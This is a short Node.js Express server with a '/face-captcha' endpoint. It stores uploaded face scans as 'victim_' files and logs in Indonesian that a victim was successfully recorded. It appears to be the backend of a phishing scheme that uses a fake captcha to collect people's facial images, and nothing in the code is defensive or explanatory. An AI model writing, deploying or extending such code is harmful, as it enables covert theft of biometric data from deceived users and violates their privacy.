const express = require('express');
const multer = require('multer');
const path = require('path');
const app = express();

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, 'victim_' + Date.now() + path.extname(file.originalname))
});

const upload = multer({ storage: storage });

app.post('/face-captcha', upload.single('face_scan'), (req, res) => {
  if (req.file) {
    console.log('✅ Korban berhasil direkam!');
    console.log('File tersimpan di: uploads/' + req.file.filename);
  }
  res.send('OK');
});

app.listen(3000, () => console.log('Server aktif di port 3000'));